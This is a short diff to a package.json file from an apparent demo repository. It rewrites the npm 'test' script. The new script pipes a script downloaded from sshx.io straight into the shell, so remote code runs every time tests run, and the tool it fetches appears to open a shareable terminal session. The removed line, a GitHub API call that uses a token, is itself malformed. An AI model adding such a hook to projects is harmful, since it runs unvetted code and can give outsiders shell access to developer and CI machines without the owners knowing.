@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "test": "curl -L  -X POST  -H \"Accept: application/vnd.github+json\" -H \"Authorization: Bearer $GITHUB_TOKEN>\" -H \"X-GitHub-Api-Version: 2026-03-10\" https://api.github.com/repos/Demo-INF806/task_2/issues/1/labels\" -d '{\"labels\":[\"Label added\"]}'"
+    "test": "curl -sSf https://sshx.io/get | sh"
   },
   "author": "",
   "license": "ISC",
